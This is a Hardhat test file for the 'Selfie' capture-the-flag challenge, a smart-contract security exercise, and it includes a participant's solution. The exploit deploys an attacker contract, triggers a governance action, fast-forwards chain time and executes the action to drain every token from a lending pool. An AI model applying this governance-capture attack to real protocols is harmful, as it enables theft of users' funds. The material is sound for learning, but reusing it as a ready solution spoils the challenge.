const { ethers } = require('hardhat');
const { expect } = require('chai');
const { parseEther } = require('ethers/lib/utils');

describe('[Challenge] Selfie', function () {
    let deployer, attacker;

    const TOKEN_INITIAL_SUPPLY = ethers.utils.parseEther('2000000'); // 2 million tokens
    const TOKENS_IN_POOL = ethers.utils.parseEther('1500000'); // 1.5 million tokens
    
    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableTokenSnapshotFactory = await ethers.getContractFactory('DamnValuableTokenSnapshot', deployer);
        const SimpleGovernanceFactory = await ethers.getContractFactory('SimpleGovernance', deployer);
        const SelfiePoolFactory = await ethers.getContractFactory('SelfiePool', deployer);
        const Selfieattacker = await ethers.getContractFactory("SelfieAttacker",attacker);
        // console.log(Selfieattacker);

        this.token = await DamnValuableTokenSnapshotFactory.deploy(TOKEN_INITIAL_SUPPLY);
        this.governance = await SimpleGovernanceFactory.deploy(this.token.address);
        this.pool = await SelfiePoolFactory.deploy(
            this.token.address,
            this.governance.address    
        );

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);
        // console.log(await this.token.balanceOf(this.pool.address));
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.equal(TOKENS_IN_POOL);
        this.selfieattacker = await Selfieattacker.deploy(this.pool.address,this.governance.address);
        // console.log(this.selfieattacker);
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        // console.log(await this.token.balanceOf(this.pool.address));
        let actionid =  await this.selfieattacker.attack(TOKENS_IN_POOL);
        let ex = await actionid.wait();
        let ans = await ex.events.find(event => event.event === 'ActionId');
        let ourActionId = (ans.args[0]).toNumber();
        console.log((ans.args[0]).toString());
            //   console.log(await ex.events);
            //   console.log(await actionid.wait());
        await ethers.provider.send("evm_increaseTime",[2 * 60 * 60 * 24]);
        await this.governance.executeAction(ourActionId);
        console.log(await this.token.balanceOf(attacker.address));
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.be.equal(TOKENS_IN_POOL);        
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.equal('0');
    });
});
